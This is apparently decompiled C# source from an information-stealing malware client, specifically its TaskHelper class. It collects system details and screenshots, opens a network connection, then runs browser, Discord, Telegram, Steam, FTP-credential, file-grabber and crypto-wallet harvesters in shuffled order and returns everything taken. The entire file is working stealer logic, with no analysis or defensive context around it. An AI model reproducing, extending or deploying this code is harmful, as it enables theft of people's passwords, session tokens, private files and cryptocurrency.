using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using client.Body;
using client.Models;
using client.Network;

namespace client.Helpers
{
	// Token: 0x02000020 RID: 32
	internal class TaskHelper
	{
		// Token: 0x17000044 RID: 68
		// (get) Token: 0x060000C0 RID: 192 RVA: 0x00002F84 File Offset: 0x00001184
		// (set) Token: 0x060000C1 RID: 193 RVA: 0x00002F8B File Offset: 0x0000118B
		private static List<ChromiumBrowserStructure> _c { get; set; }

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x060000C2 RID: 194 RVA: 0x00002F93 File Offset: 0x00001193
		// (set) Token: 0x060000C3 RID: 195 RVA: 0x00002F9A File Offset: 0x0000119A
		private static List<GeckoBrowserStructure> _g { get; set; }

		// Token: 0x17000046 RID: 70
		// (get) Token: 0x060000C4 RID: 196 RVA: 0x00002FA2 File Offset: 0x000011A2
		// (set) Token: 0x060000C5 RID: 197 RVA: 0x00002FA9 File Offset: 0x000011A9
		private static List<DefaultFileStructure> _d { get; set; }

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x060000C6 RID: 198 RVA: 0x00002FB1 File Offset: 0x000011B1
		// (set) Token: 0x060000C7 RID: 199 RVA: 0x00002FB8 File Offset: 0x000011B8
		private static List<Credentials> _cr { get; set; }

		// Token: 0x17000048 RID: 72
		// (get) Token: 0x060000C8 RID: 200 RVA: 0x00002FC0 File Offset: 0x000011C0
		// (set) Token: 0x060000C9 RID: 201 RVA: 0x00002FC7 File Offset: 0x000011C7
		private static InformationStructure _i { get; set; }

		// Token: 0x17000049 RID: 73
		// (get) Token: 0x060000CA RID: 202 RVA: 0x00002FCF File Offset: 0x000011CF
		// (set) Token: 0x060000CB RID: 203 RVA: 0x00002FD6 File Offset: 0x000011D6
		private static byte[] _s { get; set; }

		// Token: 0x060000CC RID: 204 RVA: 0x00002FDE File Offset: 0x000011DE
		public TaskHelper()
		{
			TaskHelper._c = new List<ChromiumBrowserStructure>();
			TaskHelper._g = new List<GeckoBrowserStructure>();
			TaskHelper._d = new List<DefaultFileStructure>();
			TaskHelper._cr = new List<Credentials>();
			TaskHelper._i = new InformationStructure();
			TaskHelper._s = null;
		}

		// Token: 0x060000CD RID: 205 RVA: 0x00003020 File Offset: 0x00001220
		public void Randomize()
		{
			List<Task> list = new List<Task>();
			list.Add(new Task(delegate()
			{
				TaskHelper._i = System.GetInformation();
			}));
			list.Add(new Task(delegate()
			{
				TaskHelper._s = ((Config.EnableScreenshot == "1") ? System.GetScreenshots() : null);
			}));
			list.Add(new Task(delegate()
			{
				Connection.Initialize();
			}));
			List<Task> source = list;
			List<Task> list2 = new List<Task>();
			list2.Add(new Task(delegate()
			{
				TaskHelper._c = Chromium.Get();
			}));
			list2.Add(new Task(delegate()
			{
				TaskHelper._g = Gecko.Get();
			}));
			list2.Add(new Task(delegate()
			{
				DefaultFileStructure defaultFileStructure = Discord.Get();
				if (defaultFileStructure != null)
				{
					TaskHelper._d.Add(defaultFileStructure);
				}
			}));
			list2.Add(new Task(delegate()
			{
				List<DefaultFileStructure> list3 = Telegram.Get();
				if (list3 != null)
				{
					TaskHelper._d.AddRange(list3);
				}
			}));
			list2.Add(new Task(delegate()
			{
				List<DefaultFileStructure> list3 = Grabber.Get();
				if (list3 != null)
				{
					TaskHelper._d.AddRange(list3);
				}
			}));
			list2.Add(new Task(delegate()
			{
				List<DefaultFileStructure> list3 = Steam.Get();
				if (list3 != null)
				{
					TaskHelper._d.AddRange(list3);
				}
			}));
			list2.Add(new Task(delegate()
			{
				List<Credentials> list3 = FTP.Get();
				if (list3 != null)
				{
					TaskHelper._cr.AddRange(list3);
				}
			}));
			list2.Add(new Task(delegate()
			{
				List<DefaultFileStructure> list3 = Wallets.Get();
				if (list3 != null)
				{
					TaskHelper._d.AddRange(list3);
				}
			}));
			Random r = new Random();
			TaskHelper._phase1 = (from item in source
			orderby r.Next()
			select item).ToList<Task>();
			TaskHelper._phase2 = (from item in list2
			orderby r.Next()
			select item).ToList<Task>();
		}

		// Token: 0x060000CE RID: 206 RVA: 0x00003250 File Offset: 0x00001450
		public void Process(out List<ChromiumBrowserStructure> c, out List<GeckoBrowserStructure> g, out List<DefaultFileStructure> d, out InformationStructure i, out byte[] s, out List<Credentials> cr)
		{
			TaskHelper._phase1.ForEach(delegate(Task t)
			{
				t.Start();
			});
			Task.WaitAll(TaskHelper._phase1.ToArray());
			TaskHelper._phase2.ForEach(delegate(Task t)
			{
				t.Start();
			});
			List<Task> phase = TaskHelper._phase2;
			Task.WaitAll((phase != null) ? phase.ToArray() : null);
			c = TaskHelper._c;
			g = TaskHelper._g;
			d = TaskHelper._d;
			i = TaskHelper._i;
			s = TaskHelper._s;
			cr = TaskHelper._cr;
		}

		// Token: 0x04000069 RID: 105
		private static List<Task> _phase1 = new List<Task>();

		// Token: 0x0400006A RID: 106
		private static List<Task> _phase2 = new List<Task>();
	}
}
